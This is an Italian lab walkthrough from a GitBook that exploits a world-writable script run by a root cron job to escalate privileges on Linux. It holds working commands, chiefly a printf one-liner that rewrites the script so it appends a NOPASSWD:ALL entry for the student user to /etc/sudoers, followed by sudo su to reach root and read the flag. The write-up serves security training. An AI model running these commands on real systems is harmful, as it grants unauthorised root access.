# Exploiting Misconfigured Cron Jobs

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Per elevare i privilegi possiamo ad esempio connetterci ad un netcat listener oppure aggiungere un utente a cui abbiamo già accesso al file sudoers, in modo da poter poi eseguire task che richiedono root privileges senza inserire ulteriori password.

Se il shell script nel cronjob può essere modificato da ogni utente, quindi è stato misconfigurato, allora possiamo modificare lo script nel cronjob e ottenere quindi l'esecuzione di comandi che vogliamo.

## Identificare i cron jobs

Nel laboratorio ci viene già fornito accesso alla macchina vittima come utente non privilegiato di nome student:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Non fa parte del gruppo sudo quindi è un utente non privilegiato.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Il nostro target account è root o i permessi associati a tale account.

### Identificare i cron jobs degli utenti

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Non abbiamo cron jobs per student.

Per verificare tutti i cron jobs di tutti gli utenti è richiesta molta enumeration e ricerca.

Ai fini di questo laboratorio lo scenario è stato reso più semplice:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vediamo che nella nostra folder di student c'è un file di root, che non possiamo vedere o modificare.

Per identificare dove questo file viene chiamato (e quindi probabilmente il file crontab dove è contenuto) possiamo cercare la stringa del path con l'utility grep.

```
ls -al
pd
cat message
cd /
grep -rnw /usr -e "/home/student/message"   //la cartella /usr è dove tipicamente troviamo degli shell script
// è presente un file /usr/local/share/copy.sh che fa una copia di questo file message in /tmp/
ls -al /tmp
cat /tmp/message
ls -al /usr/local/share/copy.sh //dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab
cat /usr/local/share/copy.sh
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

è presente un file /usr/local/share/copy.sh che fa una copia di questo file message in /tmp/

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Guardando il file script /usr/local/share/copy.sh vediamo che il file appartiene a root, ma i permessi sono settati per consentire lettura, modifica ed esecuzione a tutti gli utenti.\
Dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab. Il cronjob associato non sappiamo quando verrà eseguito nella realtà. Ai fini del laboratorio viene eseguito ogni minuto.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Modificare il file script

In questo lab environment non abbiamo dei text editor installati, per cui dobbiamo trovare un modo ingegnoso di modificare il file, e lo faremo con **printf**:

```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l //Possiamo verificare gli utenti che sono parte di sudoers e vedere che la riga è stata aggiunta (dopo l'esecuzione del cron job)
sudo su //e funziona
whoami //root user
cd /root
ls
cat flag
```

Ciò che stiamo dicendo di fare è di fare un redirect dell'output "student ALL=NOPASSWD:ALL" nel file sudoers. \
Quella stringa singifica che l'utente student dovrebbe avere ALL privileges e non ha bisogno di specificare la password.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo verificare gli utenti che sono parte di sudoers con: **sudo -l**.

Attendiamo poi un paio di minuti per vedere se il cronjob è stato eseguito e l'utente student è stato inserito nel file sudoers, ed il risultato è questo:

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dove viene detto che l'utente student può eseguire i seguenti comandi sul sistema (di nome attackdefense):\
NOPASSWD: ALL, mentre prima potevano già interagire con l'utility cron.

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

## Riassunto delle fasi

1. Identificare quali file/script sono usati da un cronjob
2. Identificare se quello shell script può essere modificato da un utente non privilegiato
3. modificare lo script inserendo un comando che aggiunga l'utente con il quale abbiamo accesso al file sudoers.
